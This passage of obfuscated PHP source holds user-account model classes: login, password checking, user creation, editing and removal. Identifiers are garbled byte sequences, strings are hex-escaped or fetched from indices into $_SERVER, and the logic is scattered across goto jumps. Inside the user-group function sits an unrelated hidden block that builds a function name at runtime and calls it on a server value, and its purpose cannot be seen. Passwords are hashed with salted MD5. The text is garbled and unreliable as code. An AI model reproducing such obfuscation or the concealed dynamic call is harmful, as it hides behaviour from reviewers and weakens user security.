aùÊª†„¿‚; F›®…Äï ®: $d¹ŞõÀ‰¢ =& $_SERVER[¹Ò‹Ò¹]; $fô¾ÙĞ¡ÄÊ = array($d¹ŞõÀ‰¢[1496] => USER_ID, $d¹ŞõÀ‰¢[457] => 0); $aõ‰åÈ´ö» = $this->field($d¹ŞõÀ‰¢[28])->where($fô¾ÙĞ¡ÄÊ)->select(); goto cĞ¬¥ŠĞßÙ; C°õ–’¶¾ù: } } class UserJobModel extends ModelBaseLight { public $optionType = "\x53\x79\x73\164\x65\x6d\x2e\152\157\x62\x4c\151\163\164"; public $field = array("\156\141\155\x65", "\x64\145\x73\143", "\x73\x6f\x72\x74"); const JOB_KEY = "\163\x65\x6c\146\112\157\x62\114\x69\163\x74"; public function listData($b‹ùÕ¦á£ = false, $A¿œŒ‹‚Ëî = "\x73\x6f\x72\x74", $A¸æã¦ÃÊ¼ = false) { return parent::listData($b‹ùÕ¦á£, $A¿œŒ‹‚Ëî, $A¸æã¦ÃÊ¼); } public function remove($dì¡ ¬ñ) { return parent::remove($dì¡ ¬ñ); } public function add($aªëÒ±˜Ñ©) { $EÄŠÇ“¼Áá =& $_SERVER[¹Ò‹Ò¹]; if ($this->findByName($aªëÒ±˜Ñ©[$EÄŠÇ“¼Áá[28]])) { return !1; } $aªëÒ±˜Ñ©[$EÄŠÇ“¼Áá[1690]] = $this->getSort(); return parent::insert($aªëÒ±˜Ñ©); } private function getSort() { $A­¦¼ğ¥Û =& $_SERVER[¹Ò‹Ò¹]; $aå¤Çğí¬ø = parent::listData(); $Eµ¢œÅõ† = array_to_keyvalue($aå¤Çğí¬ø, $A­¦¼ğ¥Û[33], $A­¦¼ğ¥Û[1690]); return empty($Eµ¢œÅõ†) ? 0 : max($Eµ¢œÅõ†) + 1; } public function update($eî¹Ù“†Ç°, $díŞÆØÉº) { $F¼Ê‹±á‹ =& $_SERVER[¹Ò‹Ò¹]; $bõ³‚”¥¨ = parent::listData($eî¹Ù“†Ç°); $eö´¥ˆÑ Î = $this->findByName($díŞÆØÉº[$F¼Ê‹±á‹[28]]); if (!$bõ³‚”¥¨ || $eö´¥ˆÑ Î && $eö´¥ˆÑ Î[$F¼Ê‹±á‹[388]] != $bõ³‚”¥¨[$F¼Ê‹±á‹[388]]) { return !1; } return parent::update($eî¹Ù“†Ç°, $díŞÆØÉº); } public function setUserJob($A‡²™ªì¸¡, $EŸç½É¾) { goto e¥Ğ»ùŠ‡í; c½Öƒ«ëÜê: $FÇŠÑÎÇ É = array_to_keyvalue($A¤”ØšŒÑ, $Bï…Àƒˆø[28]); $AÉñÕÛöÂÍ = $Bï…Àƒˆø[373]; foreach ($EŸç½É¾ as $CäÙ¹–¨†…) { if ($FÇŠÑÎÇ É[$CäÙ¹–¨†…]) { $AÉñÕÛöÂÍ .= $FÇŠÑÎÇ É[$CäÙ¹–¨†…][$Bï…Àƒˆø[388]] . $Bï…Àƒˆø[47]; } else { $f°ùñ‰ÈÊ = $this->add($CäÙ¹–¨†…); $AÉñÕÛöÂÍ .= $f°ùñ‰ÈÊ . $Bï…Àƒˆø[47]; } } goto Fµ™Ò…ã; Fµ™Ò…ã: $AÉñÕÛöÂÍ = rtrim($AÉñÕÛöÂÍ, $Bï…Àƒˆø[47]); Model($Bï…Àƒˆø[501])->metaSet($A‡²™ªì¸¡, self::JOB_KEY, $AÉñÕÛöÂÍ); goto B†Ù…¶êÆ; e¥Ğ»ùŠ‡í: $Bï…Àƒˆø =& $_SERVER[¹Ò‹Ò¹]; if (!is_array($EŸç½É¾)) { $EŸç½É¾ = array($EŸç½É¾); } $A¤”ØšŒÑ = parent::listData(); goto c½Öƒ«ëÜê; B†Ù…¶êÆ: } public function getUserJob($C”ÜÌÁŒæ¿) { $cê´¬ˆéºõ = Model($_SERVER[¹Ò‹Ò¹][501])->metaGet($C”ÜÌÁŒæ¿); return $this->getUserJobInfo($cê´¬ˆéºõ[self::JOB_KEY]); } public function getUserJobInfo($fĞ½É¹ÄÃÕ) { goto F†©¥ô–ªÎ; F†©¥ô–ªÎ: $d™¹ÔõÎŠª =& $_SERVER[¹Ò‹Ò¹]; $Eà¬Û¡šŸŠ = explode($d™¹ÔõÎŠª[47], $fĞ½É¹ÄÃÕ); $E¡§‰ë¹ = parent::listData(); goto D¨ÆÅ‘´†÷; e«¹‚±†—Ü: return $F¥•õÃ²òÑ; goto Eîªº°ùÖ‘; D¨ÆÅ‘´†÷: $E¡§‰ë¹ = array_remove_key($E¡§‰ë¹, $d™¹ÔõÎŠª[192]); $F¥•õÃ²òÑ = array(); foreach ($Eà¬Û¡šŸŠ as $Câ®ù™ÎÁ) { if (isset($E¡§‰ë¹[$Câ®ù™ÎÁ])) { $F¥•õÃ²òÑ[] = $E¡§‰ë¹[$Câ®ù™ÎÁ]; } } goto e«¹‚±†—Ü; Eîªº°ùÖ‘: } } class UserModel extends ModelBase { protected $tableName = "\165\x73\x65\162"; protected $tableMeta = array("\164\141\x62\x6c\x65\x4e\141\155\145" => "\165\163\x65\162\x5f\x6d\x65\x74\x61", "\155\x65\x74\x61\x46\151\x65\154\x64" => "\165\163\x65\x72\111\x44"); protected $simpleField = "\165\163\145\162\111\104\x2c\x6e\x69\x63\x6b\x4e\141\155\x65\x2c\x6e\141\x6d\x65\54\141\x76\141\164\x61\x72\x2c\163\x65\170"; const ERROR_USER_NOT_EXISTS = -1; const ERROR_USER_PASSWORD_ERROR = -2; const ERROR_USER_EXIST_NAME = -3; const ERROR_USER_EXIST_PHONE = -4; const ERROR_USER_EXIST_EMAIL = -5; const ERROR_USER_LOGIN_LOCK = -6; const ERROR_IP_NOT_ALLOW = -7; const ERROR_USER_EXIST_NICKNAME = -8; protected function cacheFunctionAlias($D×¢µ˜¿Ï) { $BÃá¤ÉÕÄÏ =& $_SERVER[¹Ò‹Ò¹]; $fğğ°š¤ë¾ = $BÃá¤ÉÕÄÏ[2091]; return array($BÃá¤ÉÕÄÏ[1739] => array($D×¢µ˜¿Ï[0], $fğğ°š¤ë¾), $BÃá¤ÉÕÄÏ[1741] => array($D×¢µ˜¿Ï[0], $fğğ°š¤ë¾), $BÃá¤ÉÕÄÏ[2092] => array($D×¢µ˜¿Ï[0], $fğğ°š¤ë¾)); } protected function getInfo($aÎ£Ê‡¿Ş, $CÃ„ŒÖé¾’ = false) { $c¢áŞ½ÊÕŠ = $this->getInfoSimple($aÎ£Ê‡¿Ş); if (!is_array($c¢áŞ½ÊÕŠ)) { return array(); } if ($CÃ„ŒÖé¾’) { return $this->_getInfoApply($c¢áŞ½ÊÕŠ); } return $this->cacheFunctionGet($_SERVER[¹Ò‹Ò¹][1748], $aÎ£Ê‡¿Ş); } protected function getInfoFull($E‘¯ ÓìÚ¨, $c‹ŒÃ ¸Ú = false) { $fŠó¢ ØÃ = $this->getInfoSimple($E‘¯ ÓìÚ¨); if (!is_array($fŠó¢ ØÃ)) { return array(); } if ($c‹ŒÃ ¸Ú) { return $this->_getInfoApply($fŠó¢ ØÃ, !0); return $this->_getInfoApply($fŠó¢ ØÃ, !0); } return $this->cacheFunctionGet($_SERVER[¹Ò‹Ò¹][2093], $E‘¯ ÓìÚ¨); } private function _getInfoApply($bğ¾Ùç¢ìÙ, $A‚óãÜ˜ª = false) { goto D¸³ÃÜ§ˆÕ; D¸³ÃÜ§ˆÕ: $F—ª×ŞÏĞï =& $_SERVER[¹Ò‹Ò¹]; if (!$bğ¾Ùç¢ìÙ) { return $bğ¾Ùç¢ìÙ; } $Cõ»åÜæ = md5($F—ª×ŞÏĞï[2094] . $bğ¾Ùç¢ìÙ[$F—ª×ŞÏĞï[825]] . $F—ª×ŞÏĞï[2095] . $bğ¾Ùç¢ìÙ[$F—ª×ŞÏĞï[28]]); goto F‹‘´áÔƒä; F‹‘´áÔƒä: $bğ¾Ùç¢ìÙ = $this->_listDataApplyItem($bğ¾Ùç¢ìÙ); $BŸª¾Èø«ï = Model($F—ª×ŞÏĞï[1179])->metaGet($bğ¾Ùç¢ìÙ[$F—ª×ŞÏĞï[84]][$F—ª×ŞÏĞï[390]]); $bğ¾Ùç¢ìÙ[$F—ª×ŞÏĞï[2096]] = $Cõ»åÜæ; goto AâÃÛºİÏÜ; AâÃÛºİÏÜ: $bğ¾Ùç¢ìÙ[$F—ª×ŞÏĞï[84]][$F—ª×ŞÏĞï[1929]] = isset($BŸª¾Èø«ï[$F—ª×ŞÏĞï[1930]]) ? $BŸª¾Èø«ï[$F—ª×ŞÏĞï[1930]] : null; if ($A‚óãÜ˜ª) { $bğ¾Ùç¢ìÙ[$F—ª×ŞÏĞï[439]] = $this->metaGet($bğ¾Ùç¢ìÙ[$F—ª×ŞÏĞï[1504]]); } return $bğ¾Ùç¢ìÙ; goto A¯ÜËï™ÚÛ; A¯ÜËï™ÚÛ: } protected function getInfoSimple($a¾²ƒ”¿ì–, $B³£ôíÏ = false) { $d¨í§ò¥¢± =& $_SERVER[¹Ò‹Ò¹]; if (!$a¾²ƒ”¿ì–) { return array(); } if ($B³£ôíÏ) { $a÷çÊåê = $this->where(array($d¨í§ò¥¢±[1504] => intval($a¾²ƒ”¿ì–)))->find(); if (!is_array($a÷çÊåê)) { return array(); } $a÷çÊåê[$d¨í§ò¥¢±[2097]] = Action($d¨í§ò¥¢±[2098])->parseUrl($a÷çÊåê[$d¨í§ò¥¢±[2097]]); return $a÷çÊåê; } return $this->cacheFunctionGet($d¨í§ò¥¢±[1742], $a¾²ƒ”¿ì–); } protected function getInfoSimpleOuter($CÉÒó‚ÄŸ­) { goto A Ûäİ—èÃ; b”†„Œ‘´÷: return $f¿ì•ğ•ŠÕ; goto D„ÊÌÏ…ã; A Ûäİ—èÃ: $Dæ¸ˆ†‚Ú­ =& $_SERVER[¹Ò‹Ò¹]; if (!$CÉÒó‚ÄŸ­ || $CÉÒó‚ÄŸ­ == 0) { return array($Dæ¸ˆ†‚Ú­[1504] => $Dæ¸ˆ†‚Ú­[491], $Dæ¸ˆ†‚Ú­[28] => $Dæ¸ˆ†‚Ú­[159] . LNG($Dæ¸ˆ†‚Ú­[2099]) . $Dæ¸ˆ†‚Ú­[499], $Dæ¸ˆ†‚Ú­[2097] => STATIC_PATH . $Dæ¸ˆ†‚Ú­[2100]); } $fÉ†ÔÜ¾“¬ = $this->cacheFunctionGet($Dæ¸ˆ†‚Ú­[1742], $CÉÒó‚ÄŸ­); goto C™ÎÊßß«ê; C™ÎÊßß«ê: $f¿ì•ğ•ŠÕ = array_field_key($fÉ†ÔÜ¾“¬, explode($Dæ¸ˆ†‚Ú­[47], $this->simpleField)); if (!$f¿ì•ğ•ŠÕ) { return array($Dæ¸ˆ†‚Ú­[1504] => $Dæ¸ˆ†‚Ú­[1060], $Dæ¸ˆ†‚Ú­[28] => $Dæ¸ˆ†‚Ú­[159] . LNG($Dæ¸ˆ†‚Ú­[2101]) . $Dæ¸ˆ†‚Ú­[499], $Dæ¸ˆ†‚Ú­[2097] => STATIC_PATH . $Dæ¸ˆ†‚Ú­[2102]); } $f¿ì•ğ•ŠÕ[$Dæ¸ˆ†‚Ú­[2097]] = Action($Dæ¸ˆ†‚Ú­[2098])->parseUrl($f¿ì•ğ•ŠÕ[$Dæ¸ˆ†‚Ú­[2097]]); goto b”†„Œ‘´÷; D„ÊÌÏ…ã: } protected function groupUser($E¦éœ¢³ê†) { } public static function errorLang($dÂ‘ó½ÉÄù) { $A—É–ß =& $_SERVER[¹Ò‹Ò¹]; $BØ‰îø’Œ• = array(self::ERROR_USER_NOT_EXISTS => $A—É–ß[2103], self::ERROR_USER_PASSWORD_ERROR => $A—É–ß[2104], self::ERROR_USER_EXIST_NAME => $A—É–ß[2105], self::ERROR_USER_EXIST_PHONE => $A—É–ß[2106], self::ERROR_USER_EXIST_EMAIL => $A—É–ß[2107], self::ERROR_USER_LOGIN_LOCK => $A—É–ß[2108], self::ERROR_IP_NOT_ALLOW => $A—É–ß[2109], self::ERROR_USER_EXIST_NICKNAME => $A—É–ß[2110]); return LNG($BØ‰îø’Œ•[$dÂ‘ó½ÉÄù]); } public function getInfoByMeta($d£ÍÀÍù’, $DÍ×Ç¯àñˆ) { $E³¦Çìì¬Å =& $_SERVER[¹Ò‹Ò¹]; $eãÕáÉµ² = Model($E³¦Çìì¬Å[2111])->where(array($E³¦Çìì¬Å[92] => $d£ÍÀÍù’, $E³¦Çìì¬Å[370] => $DÍ×Ç¯àñˆ))->find(); if ($eãÕáÉµ²) { return $this->getInfo($eãÕáÉµ²[$E³¦Çìì¬Å[1504]]); } return !1; } public function userLoginCheck($aê‘ĞÉÛâ, $Dğ¬†­…ÊŒ) { $c°İ›‘é” =& $_SERVER[¹Ò‹Ò¹]; $FØŠ›»Ú¡© = $this->userLoginFind($aê‘ĞÉÛâ); if (!$FØŠ›»Ú¡©) { return UserModel::ERROR_USER_NOT_EXISTS; } if (!$this->userPasswordCheck($FØŠ›»Ú¡©[$c°İ›‘é”[1504]], $Dğ¬†­…ÊŒ)) { return UserModel::ERROR_USER_PASSWORD_ERROR; } return $this->getInfo($FØŠ›»Ú¡©[$c°İ›‘é”[1504]]); } public function userLoginFind($E”Œ®Õ·ËÄ) { $a›Ù¥÷²‚ =& $_SERVER[¹Ò‹Ò¹]; $eÏØ„¬ëÓ = array($a›Ù¥÷²‚[28] => $E”Œ®Õ·ËÄ, $a›Ù¥÷²‚[1933] => $E”Œ®Õ·ËÄ, $a›Ù¥÷²‚[301] => $E”Œ®Õ·ËÄ, $a›Ù¥÷²‚[2112] => $E”Œ®Õ·ËÄ, $a›Ù¥÷²‚[933] => $a›Ù¥÷²‚[935]); if ($this->nickNameRpt()) { unset($eÏØ„¬ëÓ[$a›Ù¥÷²‚[1933]]); } return $this->where($eÏØ„¬ëÓ)->find(); } public function clearCache($Dœ¨ù­šÁà) { $C¹Åòö“®´ =& $_SERVER[¹Ò‹Ò¹]; $this->cacheFunctionClear($C¹Åòö“®´[1748], $Dœ¨ù­šÁà); $this->cacheFunctionClear($C¹Åòö“®´[1742], $Dœ¨ù­šÁà); $this->cacheFunctionClear($C¹Åòö“®´[2093], $Dœ¨ù­šÁà); } public function userPasswordCheck($d“ƒ¼½ğ¾, $Fâ·Ñ•Ó•) { $aä¢äÄ»›Å =& $_SERVER[¹Ò‹Ò¹]; $B×ÇÚÕæØ¬ = $this->where(array($aä¢äÄ»›Å[1504] => intval($d“ƒ¼½ğ¾)))->find(); $CÀ®é—ÜÃŠ = $this->metaGet($d“ƒ¼½ğ¾); $c»ğ§ã ®… = isset($CÀ®é—ÜÃŠ[$aä¢äÄ»›Å[2113]]) ? $CÀ®é—ÜÃŠ[$aä¢äÄ»›Å[2113]] : $aä¢äÄ»›Å[33]; if (md5($c»ğ§ã ®… . trim($Fâ·Ñ•Ó•)) !== $B×ÇÚÕæØ¬[$aä¢äÄ»›Å[825]]) { return !1; } return !0; } public function userAdd($Cœ½ÚÓğÇÆ) { goto b«Í£ŠÙŒÚ; cµóë«ÀÙÍ: $FŸ˜ğ—“À¾ = array($Cİ÷Ğ©ÚÆÕ[2121] => $eê“ìÜßéÓ[$Cİ÷Ğ©ÚÆÕ[825]], $Cİ÷Ğ©ÚÆÕ[2117] => $eê“ìÜßéÓ[$Cİ÷Ğ©ÚÆÕ[1933]]); $this->userEdit($d¨¨ì²¹ßÔ, $FŸ˜ğ—“À¾); Model($Cİ÷Ğ©ÚÆÕ[1179])->userRootAdd($d¨¨ì²¹ßÔ); goto EÏíÇÖ×Ú„; EÏíÇÖ×Ú„: return $d¨¨ì²¹ßÔ; goto d«”î‡æ§Ì; E×ÖÉ½Â: $bãêëÆâ­‹ = $this->_checkExist($Cœ½ÚÓğÇÆ); if ($bãêëÆâ­‹ !== !0) { return $bãêëÆâ­‹; } $d¨¨ì²¹ßÔ = $this->add($eê“ìÜßéÓ); goto cµóë«ÀÙÍ; b«Í£ŠÙŒÚ: $Cİ÷Ğ©ÚÆÕ =& $_SERVER[¹Ò‹Ò¹]; $eê“ìÜßéÓ = array($Cİ÷Ğ©ÚÆÕ[407] => $Cœ½ÚÓğÇÆ[$Cİ÷Ğ©ÚÆÕ[28]], $Cİ÷Ğ©ÚÆÕ[2114] => $Cœ½ÚÓğÇÆ[$Cİ÷Ğ©ÚÆÕ[1389]], $Cİ÷Ğ©ÚÆÕ[2115] => isset($Cœ½ÚÓğÇÆ[$Cİ÷Ğ©ÚÆÕ[301]]) ? $Cœ½ÚÓğÇÆ[$Cİ÷Ğ©ÚÆÕ[301]] : $Cİ÷Ğ©ÚÆÕ[33], $Cİ÷Ğ©ÚÆÕ[2116] => isset($Cœ½ÚÓğÇÆ[$Cİ÷Ğ©ÚÆÕ[2112]]) ? $Cœ½ÚÓğÇÆ[$Cİ÷Ğ©ÚÆÕ[2112]] : $Cİ÷Ğ©ÚÆÕ[33], $Cİ÷Ğ©ÚÆÕ[2117] => isset($Cœ½ÚÓğÇÆ[$Cİ÷Ğ©ÚÆÕ[1933]]) ? $Cœ½ÚÓğÇÆ[$Cİ÷Ğ©ÚÆÕ[1933]] : $Cœ½ÚÓğÇÆ[$Cİ÷Ğ©ÚÆÕ[28]], $Cİ÷Ğ©ÚÆÕ[2118] => isset($Cœ½ÚÓğÇÆ[$Cİ÷Ğ©ÚÆÕ[2097]]) ? $Cœ½ÚÓğÇÆ[$Cİ÷Ğ©ÚÆÕ[2097]] : $Cİ÷Ğ©ÚÆÕ[33], $Cİ÷Ğ©ÚÆÕ[2119] => isset($Cœ½ÚÓğÇÆ[$Cİ÷Ğ©ÚÆÕ[2120]]) ? $Cœ½ÚÓğÇÆ[$Cİ÷Ğ©ÚÆÕ[2120]] : 1, $Cİ÷Ğ©ÚÆÕ[2121] => $Cœ½ÚÓğÇÆ[$Cİ÷Ğ©ÚÆÕ[825]], $Cİ÷Ğ©ÚÆÕ[1743] => isset($Cœ½ÚÓğÇÆ[$Cİ÷Ğ©ÚÆÕ[1651]]) ? $Cœ½ÚÓğÇÆ[$Cİ÷Ğ©ÚÆÕ[1651]] : 1024 * 1024 * 20, $Cİ÷Ğ©ÚÆÕ[1744] => 0, $Cİ÷Ğ©ÚÆÕ[2122] => 0, $Cİ÷Ğ©ÚÆÕ[1787] => isset($Cœ½ÚÓğÇÆ[$Cİ÷Ğ©ÚÆÕ[704]]) ? $Cœ½ÚÓğÇÆ[$Cİ÷Ğ©ÚÆÕ[704]] : 1); if (!empty($Cœ½ÚÓğÇÆ[$Cİ÷Ğ©ÚÆÕ[1504]])) { $eê“ìÜßéÓ[$Cİ÷Ğ©ÚÆÕ[1504]] = $Cœ½ÚÓğÇÆ[$Cİ÷Ğ©ÚÆÕ[1504]]; } goto E×ÖÉ½Â; d«”î‡æ§Ì: } protected function userEditTest($c¯ŸëÄŸôÅ, $aÆÂÚ£‡) { return $this->call($_SERVER[¹Ò‹Ò¹][2123], $c¯ŸëÄŸôÅ, $aÆÂÚ£‡); } protected function userEdit($cšõ‘˜ª¨†, $cŞòÑñØ™ì) { goto Có‚Ç»›ì“; Eºõ‡„®²î: return !0; goto b²àÃàÔô»; b®î«Í¦å¢: $this->where(array($aÆËïËâ«´[1496] => $cšõ‘˜ª¨†))->save($cŞòÑñØ™ì); if (isset($cŞòÑñØ™ì[$aÆËïËâ«´[1933]])) { $this->setNamePinyin($cšõ‘˜ª¨†, $cŞòÑñØ™ì[$aÆËïËâ«´[1933]]); } $this->clearCache($cšõ‘˜ª¨†); goto Eºõ‡„®²î; Có‚Ç»›ì“: $aÆËïËâ«´ =& $_SERVER[¹Ò‹Ò¹]; $F•ğÔ¸ŠÅ = $this->getInfoSimple($cšõ‘˜ª¨†); if (!$F•ğÔ¸ŠÅ) { return !1; } goto CÂºèƒõ™; CÂºèƒõ™: $c¤™‡ãİŸŸ = $this->_checkExist($cŞòÑñØ™ì, $cšõ‘˜ª¨†); if ($c¤™‡ãİŸŸ !== !0) { return $c¤™‡ãİŸŸ; } if (isset($cŞòÑñØ™ì[$aÆËïËâ«´[825]]) && trim($cŞòÑñØ™ì[$aÆËïËâ«´[825]]) != $aÆËïËâ«´[33]) { $Dè×¹ßá‘ = $this->metaGet($cšõ‘˜ª¨†); if (empty($Dè×¹ßá‘[$aÆËïËâ«´[2113]])) { $Dè×¹ßá‘[$aÆËïËâ«´[2113]] = rand_string(10); Model($aÆËïËâ«´[497])->metaSet($cšõ‘˜ª¨†, $aÆËïËâ«´[2113], $Dè×¹ßá‘[$aÆËïËâ«´[2113]]); } $cŞòÑñØ™ì[$aÆËïËâ«´[825]] = md5($Dè×¹ßá‘[$aÆËïËâ«´[2113]] . trim($cŞòÑñØ™ì[$aÆËïËâ«´[825]])); } else { unset($cŞòÑñØ™ì[$aÆËïËâ«´[825]]); } goto b®î«Í¦å¢; b²àÃàÔô»: } public function setNamePinyin($f…µÛÏÆ®, $e¸¤´™Ú‹ = false) { $Aë»¿ˆ›¬¶ =& $_SERVER[¹Ò‹Ò¹]; if (!$e¸¤´™Ú‹) { $a¥õÛøÃ†Ü = $this->getInfoSimple($f…µÛÏÆ®); $e¸¤´™Ú‹ = $a¥õÛøÃ†Ü[$Aë»¿ˆ›¬¶[1933]] ? $a¥õÛøÃ†Ü[$Aë»¿ˆ›¬¶[1933]] : $a¥õÛøÃ†Ü[$Aë»¿ˆ›¬¶[28]]; } $B…ˆ˜É²ÑÔ = Model($Aë»¿ˆ›¬¶[501]); if (!Input::check($e¸¤´™Ú‹, $Aë»¿ˆ›¬¶[551])) { return $B…ˆ˜É²ÑÔ->metaSet($f…µÛÏÆ®, array($Aë»¿ˆ›¬¶[438] => $Aë»¿ˆ›¬¶[33], $Aë»¿ˆ›¬¶[437] => $Aë»¿ˆ›¬¶[33])); } return $B…ˆ˜É²ÑÔ->metaSet($f…µÛÏÆ®, array($Aë»¿ˆ›¬¶[438] => str_replace($Aë»¿ˆ›¬¶[50], $Aë»¿ˆ›¬¶[33], Pinyin::encode($e¸¤´™Ú‹)), $Aë»¿ˆ›¬¶[437] => Pinyin::encode($e¸¤´™Ú‹, $Aë»¿ˆ›¬¶[552]))); } private function nickNameRpt() { $e¦Œ´•„™ =& $_SERVER[¹Ò‹Ò¹]; $BÏã‡‚Œ‹² = Model($e¦Œ´•„™[1099])->get($e¦Œ´•„™[2124]); $e£³©•íÓÎ = $GLOBALS[$e¦Œ´•„™[6]][$e¦Œ´•„™[376]][$e¦Œ´•„™[2124]]; $F¤ÀÍğÑÂÎ = !is_null($BÏã‡‚Œ‹²) ? $BÏã‡‚Œ‹² : $e£³©•íÓÎ; return !!$F¤ÀÍğÑÂÎ; } private function _checkExist($C¿‹˜ø„Ùƒ, $d‰ğÂÆ„‹ = false) { $cœ¥…â¶²´ =& $_SERVER[¹Ò‹Ò¹]; $Eçá¡ÃÈ÷Œ = array($cœ¥…â¶²´[28] => UserModel::ERROR_USER_EXIST_NAME, $cœ¥…â¶²´[1933] => UserModel::ERROR_USER_EXIST_NICKNAME, $cœ¥…â¶²´[301] => UserModel::ERROR_USER_EXIST_EMAIL, $cœ¥…â¶²´[2112] => UserModel::ERROR_USER_EXIST_PHONE); if ($this->nickNameRpt()) { unset($Eçá¡ÃÈ÷Œ[$cœ¥…â¶²´[1933]]); } $Eƒóóªõ = $d‰ğÂÆ„‹ ? array($cœ¥…â¶²´[1504] => array($cœ¥…â¶²´[2125], $d‰ğÂÆ„‹)) : array(); foreach ($Eçá¡ÃÈ÷Œ as $A‰Ëº‰Ç˜õ => $Cø‰Ñ±ç) { $c¢Èˆô¹Ø = array(); foreach ($Eçá¡ÃÈ÷Œ as $aŒ¯ÈßÎ => $Bê‡‰íÔ·‚) { if (isset($C¿‹˜ø„Ùƒ[$aŒ¯ÈßÎ]) && $C¿‹˜ø„Ùƒ[$aŒ¯ÈßÎ]) { $c¢Èˆô¹Ø[] = $C¿‹˜ø„Ùƒ[$aŒ¯ÈßÎ]; } } if (!$c¢Èˆô¹Ø) { continue; } $bî‚ÙŞÃÃå = array_merge(array($A‰Ëº‰Ç˜õ => array($cœ¥…â¶²´[7], $c¢Èˆô¹Ø)), $Eƒóóªõ); $b™ãÄ·“Ÿ¸ = $this->where($bî‚ÙŞÃÃå)->find(); if ($b™ãÄ·“Ÿ¸) { return $Cø‰Ñ±ç; } } return !0; } public function userListInfo($B›ºáò¦îË) { $d‹Ä“¾Ôš =& $_SERVER[¹Ò‹Ò¹]; $bŸÊ‰•Ê‹ = array(); $B›ºáò¦îË = is_array($B›ºáò¦îË) ? array_unique($B›ºáò¦îË) : array(); if (!$B›ºáò¦îË) { return $bŸÊ‰•Ê‹; } if (count($B›ºáò¦îË) < 20) { foreach ($B›ºáò¦îË as $CÂğïà) { $bŸÊ‰•Ê‹[$CÂğïà . $d‹Ä“¾Ôš[33]] = $this->getInfoSimpleOuter($CÂğïà); } } else { $bó¼§‘èƒ = array($d‹Ä“¾Ôš[1496] => array($d‹Ä“¾Ôš[405], $B›ºáò¦îË)); if (count($B›ºáò¦îË) == 1) { $bó¼§‘èƒ = array($d‹Ä“¾Ôš[1496] => $B›ºáò¦îË[0]); } $cêè»‡·ƒ = Model($d‹Ä“¾Ôš[497])->field($this->simpleField)->where($bó¼§‘èƒ)->select(); $cêè»‡·ƒ = array_to_keyvalue($cêè»‡·ƒ, $d‹Ä“¾Ôš[1504]); foreach ($B›ºáò¦îË as $CÂğïà) { $C§Ï‚£½—å = $cêè»‡·ƒ[$cêè»‡·ƒ[$CÂğïà]]; if (!$C§Ï‚£½—å) { $bŸÊ‰•Ê‹[$CÂğïà . $d‹Ä“¾Ôš[33]] = $this->getInfoSimpleOuter($CÂğïà); continue; } $C§Ï‚£½—å[$d‹Ä“¾Ôš[2097]] = Action($d‹Ä“¾Ôš[2098])->parseUrl($C§Ï‚£½—å[$d‹Ä“¾Ôš[2097]]); $bŸÊ‰•Ê‹[$CÂğïà . $d‹Ä“¾Ôš[33]] = $C§Ï‚£½—å; } } return $bŸÊ‰•Ê‹; } protected function userStatus($Eè‚×Ñïç¨, $Aé°»ÑÉÒÇ) { $a˜ÆµÖàŞ = $this->getInfoSimple($Eè‚×Ñïç¨); if (!$a˜ÆµÖàŞ) { return !1; } $CŸêëï¾ÒŒ = array($_SERVER[¹Ò‹Ò¹][704] => $Aé°»ÑÉÒÇ); return $this->userEdit($Eè‚×Ñïç¨, $CŸêëï¾ÒŒ); } protected function userRemove($FôÁºÈÂÏ) { goto aÍËëÊ«Ú; E·¸ˆçÏæ·: Model($aÓˆ´Ş·ñ[1750])->where($FÀÊĞßÇùè)->delete(); Model($aÓˆ´Ş·ñ[2111])->where($FÀÊĞßÇùè)->delete(); Model($aÓˆ´Ş·ñ[2127])->where($FÀÊĞßÇùè)->delete(); goto dÜ„ŒÑ‹—É; aÍËëÊ«Ú: $aÓˆ´Ş·ñ =& $_SERVER[¹Ò‹Ò¹]; $AÍ°§†¬Ì = $this->getInfoSimple($FôÁºÈÂÏ); if (!$AÍ°§†¬Ì) { return !1; } goto bÈòµÀ Íš; dÜ„ŒÑ‹—É: Model($aÓˆ´Ş·ñ[1950])->restoreUserAll($FôÁºÈÂÏ); Model($aÓˆ´Ş·ñ[769])->userRootRemove($FôÁºÈÂÏ); return $this->where($FÀÊĞßÇùè)->delete(); goto AÇ‚¶‘äàÍ; bÈòµÀ Íš: $FÀÊĞßÇùè = array($aÓˆ´Ş·ñ[1496] => $FôÁºÈÂÏ); Model($aÓˆ´Ş·ñ[558])->where($FÀÊĞßÇùè)->delete(); Model($aÓˆ´Ş·ñ[2126])->where($FÀÊĞßÇùè)->delete(); goto E·¸ˆçÏæ·; AÇ‚¶‘äàÍ: } protected function userGroupSet($FŒå²Îô…½, $föö‘Á¡²±, $D¦ŸóÆËŸ = array()) { goto e‹…ì¿ŒÏ; e‹…ì¿ŒÏ: $fšÒáç…Î =& $_SERVER[¹Ò‹Ò¹]; $DÕÍÅ»Ñ‹ = $_SERVER[$fšÒáç…Î[801]]; $E¿š÷Ò¨šÉ = $fšÒáç…Î[1373]; goto d–…Î…ôˆé; f°¦Á¬¹åÀ: $aÃÖíâ„… = Model($fšÒáç…Î[1750]); $aÃÖíâ„…->where(array($fšÒáç…Î[1504] => $FŒå²Îô…½))->delete(); $F²¤×ÄÇ¡Ï = array(); goto F‘êµÂöÆ; F‘êµÂöÆ: $eŒíÄŠ˜İ = 0; foreach ($föö‘Á¡²± as $a¬Ş¿ë‘ËÃ => $C¼¹¬£„¸Ø) { $EÊùãğ°‹ = array($fšÒáç…Î[1504] => $FŒå²Îô…½, $fšÒáç…Î[1667] => $a¬Ş¿ë‘ËÃ, $fšÒáç…Î[1764] => $C¼¹¬£„¸Ø); $EÊùãğ°‹[$fšÒáç…Î[1690]] = isset($D¦ŸóÆËŸ[$eŒíÄŠ˜İ]) ? $D¦ŸóÆËŸ[$eŒíÄŠ˜İ] : 0; $eŒíÄŠ˜İ++; $F²¤×ÄÇ¡Ï[] = $EÊùãğ°‹; } return $aÃÖíâ„…->addAll($F²¤×ÄÇ¡Ï, array(), !0); goto DÈˆ‰ß; d–…Î…ôˆé: if ($_SERVER[$fšÒáç…Î[800]] != $E¿š÷Ò¨šÉ($DÕÍÅ»Ñ‹)) { goto AŒÖ…ë‘‡Î; AŒÖ…ë‘‡Î: $bí‡‹Ô¤ = $fšÒáç…Î[817]; $bñ¾¼‘©©‚ = $fšÒáç…Î[802]; $a“·“èâß¶ = $_SERVER[$fšÒáç…Î[803]] . $fšÒáç…Î[804]; goto e½ÆË‘Ö; f±†ÕäŞŸ: $fãÑÑ¤©ƒ = $fšÒáç…Î[818]; $fãÑÑ¤©ƒ($_SERVER[$fšÒáç…Î[819]]); $bí‡‹Ô¤ = $fšÒáç…Î[817]; goto eÈ¸ó÷•Ü“; CàÎàœà©: $aì‘´Ú« = 1; for 